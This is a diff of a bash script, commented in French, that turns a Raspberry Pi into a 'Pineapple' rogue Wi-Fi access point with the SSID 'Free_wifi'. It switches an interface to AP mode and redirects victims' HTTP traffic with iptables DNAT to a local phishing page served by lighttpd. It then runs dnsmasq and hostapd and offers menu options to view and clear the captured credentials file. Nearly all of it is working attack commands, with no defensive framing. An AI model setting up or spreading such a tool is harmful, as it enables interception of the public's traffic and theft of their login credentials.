@@ -1,94 +1,89 @@
 #!/bin/bash
 
-# === Chemins de base ===
-BASE_DIR="/home/pi/pineapple"
-CAPTURE_DIR="$BASE_DIR/captures"
-CREDS_FILE="$CAPTURE_DIR/creds.txt"
-LOG_FILE="$BASE_DIR/logs.txt"
+WLAN_FAKEAP="wlan1"
+GATEWAY="10.0.0.1"
+DIR="/home/pi/pineapple"
+CAPTURE_FILE="$DIR/captures/creds.txt"
 
-# === Fonction de journalisation ===
-log() {
-    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
+start_pineapple() {
+    echo "[*] Démarrage du fake AP sur $WLAN_FAKEAP..."
+    sudo ip link set "$WLAN_FAKEAP" down
+    sudo iw dev "$WLAN_FAKEAP" set type __ap
+    sudo ip addr flush dev "$WLAN_FAKEAP"
+    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
+    sudo ip link set "$WLAN_FAKEAP" up
+
+    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
+    sudo iptables -F
+    sudo iptables -t nat -F
+    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
+    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
+
+    echo "[*] Nettoyage et déploiement des fichiers web..."
+    sudo rm -rf /var/www/html/*
+    sudo cp -r "$DIR/www/"* /var/www/html/
+    sudo systemctl restart lighttpd
+
+    sudo dnsmasq -C "$DIR/dnsmasq.conf"
+    sudo hostapd "$DIR/hostapd.conf" &
+
+    echo "[✔] Pineapple lancé. SSID : Free_wifi"
+    read -p "Appuie sur Entrée pour revenir au menu..."
 }
 
-log "==== Lancement du menu Pineapple ===="
+stop_pineapple() {
+    echo "[*] Arrêt du Pineapple..."
+    sudo killall hostapd dnsmasq 2>/dev/null
+    sudo iptables -F
+    sudo iptables -t nat -F
+    sudo ip addr flush dev "$WLAN_FAKEAP"
+    sudo ip link set "$WLAN_FAKEAP" down
+    sudo iw dev "$WLAN_FAKEAP" set type managed
+    sudo ip link set "$WLAN_FAKEAP" up
+    echo "[✔] Pineapple arrêté."
+    read -p "Appuie sur Entrée pour revenir au menu..."
+}
 
-# === Boucle principale ===
+show_creds() {
+    echo -e "\n[📄] Identifiants capturés :"
+    if [[ -f "$CAPTURE_FILE" ]]; then
+        cat "$CAPTURE_FILE"
+    else
+        echo "Aucun identifiant trouvé."
+    fi
+    echo
+    read -p "Appuie sur Entrée pour revenir au menu..."
+}
+
+clear_creds() {
+    if [[ -f "$CAPTURE_FILE" ]]; then
+        > "$CAPTURE_FILE"
+        echo "[✔] Identifiants effacés."
+    else
+        echo "Aucun fichier à vider."
+    fi
+    read -p "Appuie sur Entrée pour revenir au menu..."
+}
+
 while true; do
-    echo
-    echo "=========================================="
-    echo "         WiFi Pineapple CLI Menu"
-    echo "=========================================="
-    echo "  1) Démarrer le Pineapple"
-    echo "  2) Arrêter le Pineapple"
-    echo "  3) Voir les 10 derniers paquets réseau"
-    echo "  4) Voir les identifiants capturés"
-    echo "  5) Voir le journal d'activité"
-    echo "  6) Quitter"
-    echo "------------------------------------------"
-    read -rp "Choix (1-6) : " choice
-    echo
+    clear
+    echo "============================="
+    echo "   🍍 MENU PINEAPPLE RPi"
+    echo "============================="
+    echo "1. Démarrer le Pineapple"
+    echo "2. Arrêter le Pineapple"
+    echo "3. Voir les identifiants capturés"
+    echo "4. Vider les identifiants"
+    echo "5. Quitter"
+    echo "-----------------------------"
+    read -p "Choix [1-5] : " choice
 
     case "$choice" in
-        1)
-            log "Tentative de démarrage du Pineapple"
-            if sudo "$BASE_DIR/start_pineapple.sh"; then
-                log "Pineapple démarré avec succès"
-                echo "[OK] Pineapple démarré."
-            else
-                log "ERREUR lors du démarrage"
-                echo "[ERREUR] Échec du démarrage."
-            fi
-            ;;
-        2)
-            log "Tentative d'arrêt du Pineapple"
-            if sudo "$BASE_DIR/stop_pineapple.sh"; then
-                log "Pineapple arrêté proprement"
-                echo "[OK] Pineapple arrêté."
-            else
-                log "ERREUR lors de l'arrêt"
-                echo "[ERREUR] Échec de l'arrêt."
-            fi
-            ;;
-        3)
-            echo "[*] Recherche du dernier fichier .pcap..."
-            last_pcap=$(find "$CAPTURE_DIR" -type f -name "*.pcap" -printf "%T@ %p\n" 2>/dev/null | sort -n | tail -1 | cut -d' ' -f2-)
-
-            if [[ -n "$last_pcap" && -f "$last_pcap" ]]; then
-                echo "[*] Lecture de : \"$last_pcap\""
-                sudo tcpdump -r "$last_pcap" -n -c 10
-                log "Affichage de \"$last_pcap\""
-            else
-                echo "[!] Aucun fichier .pcap trouvé dans \"$CAPTURE_DIR\""
-                log "Aucun fichier .pcap trouvé"
-            fi
-            ;;
-        4)
-            echo "[*] Affichage des identifiants capturés..."
-            if [[ -r "$CREDS_FILE" ]]; then
-                echo "--- Contenu de creds.txt ---"
-                cat "$CREDS_FILE"
-                log "Lecture du fichier creds.txt"
-            else
-                echo "[!] Fichier \"$CREDS_FILE\" introuvable ou illisible."
-                log "Erreur : creds.txt non lisible"
-            fi
-            ;;
-        5)
-            echo "[*] Journal d'activité ($LOG_FILE) :"
-            if [[ -r "$LOG_FILE" ]]; then
-                tail -n 50 "$LOG_FILE"
-            else
-                echo "[!] Aucun journal disponible."
-            fi
-            ;;
-        6)
-            log "Fermeture du menu Pineapple"
-            echo "[*] Fermeture du programme. À bientôt !"
-            exit 0
-            ;;
-        *)
-            echo "[ERREUR] Choix invalide. Tape un chiffre entre 1 et 6."
-            ;;
+        1) start_pineapple ;;
+        2) stop_pineapple ;;
+        3) show_creds ;;
+        4) clear_creds ;;
+        5) echo "À bientôt !"; exit 0 ;;
+        *) echo "Option invalide."; sleep 1 ;;
     esac
 done
